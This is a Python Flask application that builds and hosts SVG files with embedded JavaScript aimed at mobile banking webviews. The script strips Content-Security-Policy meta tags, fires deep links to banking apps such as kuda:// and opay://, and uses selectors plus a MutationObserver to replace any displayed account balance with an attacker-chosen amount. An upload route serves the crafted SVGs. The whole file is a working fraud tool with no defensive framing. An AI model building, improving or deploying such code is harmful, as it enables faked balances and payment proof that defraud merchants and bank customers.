from flask import Flask, request, jsonify, render_template
from flask_cors import CORS
import uuid
import os
import random

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = '/tmp/uploads'
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)

# Enable CORS
CORS(app)

def generate_robust_payload(device_id, target_app, target_amount):
    # Multiple fallback techniques for webview targeting
    js_payload = f"""
    // WebView detection and hooks
    function isInWebView() {{
        return !!(window.navigator.userAgent.match(/Android/i) || 
                  window.navigator.userAgent.match(/iPhone|iPad|iPod/i));
    }}
    
    // Platform-specific hooks
    function hookWebView() {{
        if (!isInWebView()) return;
        
        // Override native methods
        const originalPushState = history.pushState;
        history.pushState = function() {{
            originalPushState.apply(this, arguments);
            setTimeout(() => {{
                document.querySelectorAll('[data-testid="balance"]').forEach(el => 
                    el.textContent = '{target_amount}'
                );
            }}, 100);
        }};
    }}
    
    // CSP bypass
    function bypassCSP() {{
        try {{
            const metaTags = document.querySelectorAll('meta[http-equiv="Content-Security-Policy"]');
            metaTags.forEach(tag => tag.remove());
        }} catch (e) {{}}
    }}
    
    // Deep link trigger
    function triggerDeepLink() {{
        try {{
            window.location = 'kuda://balance';
            window.location = 'opay://dashboard?section=balance';
            window.location = 'bank://account/balance';
        }} catch (e) {{
            setTimeout(() => {{
                document.querySelectorAll('[data-testid="balance"]').forEach(el => 
                    el.textContent = '{target_amount}'
                );
            }}, 500);
        }}
    }}
    
    // Primary override function
    function overrideBalance() {{
        const balanceSelectors = [
            '[data-testid="balance"]',
            '.account-balance',
            '[id*="balance"]',
            '[class*="amount"]'
        ];
        
        balanceSelectors.forEach(selector => {{
            const elements = document.querySelectorAll(selector);
            elements.forEach(el => el.textContent = '{target_amount}');
        }});
        
        // MutationObserver for dynamic content
        const observer = new MutationObserver(mutations => {{
            mutations.forEach(mutation => {{
                mutation.addedNodes.forEach(node => {{
                    if (node.nodeType === Node.ELEMENT_NODE) {{
                        balanceSelectors.forEach(selector => {{
                            const bal = node.querySelector(selector);
                            if (bal) bal.textContent = '{target_amount}';
                        }});
                    }}
                }});
            }});
        }});
        
        observer.observe(document.body, {{ childList: true, subtree: true }});
    }}
    
    // Run everything
    window.onload = () => {{
        bypassCSP();
        hookWebView();
        triggerDeepLink();
        overrideBalance();
    }};
    """
    
    return f"""<svg xmlns="http://www.w3.org/2000/svg">
        <script>{js_payload}</script>
    </svg>"""

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/generate', methods=['POST'])
def generate():
    device_id = request.json.get('device_id')
    target_app = request.json.get('target_app')
    target_amount = request.json.get('target_amount')
    
    payload = generate_robust_payload(device_id, target_app, target_amount)
    delay = random.randint(1000, 5000)
    payload = payload.replace('setInterval(', f'setTimeout(() => setInterval(')
    payload = payload.replace('), 1000)', f'), {delay})')
    
    return jsonify({'payload': payload})

@app.route('/upload', methods=['POST'])
def upload():
    if 'file' not in request.files:
        return jsonify({'error': 'No file uploaded'}), 400
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No file selected'}), 400
    
    filename = f"{uuid.uuid4()}.svg"
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    file.save(filepath)
    
    return jsonify({'url': f"{request.url_root}uploads/{filename}"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
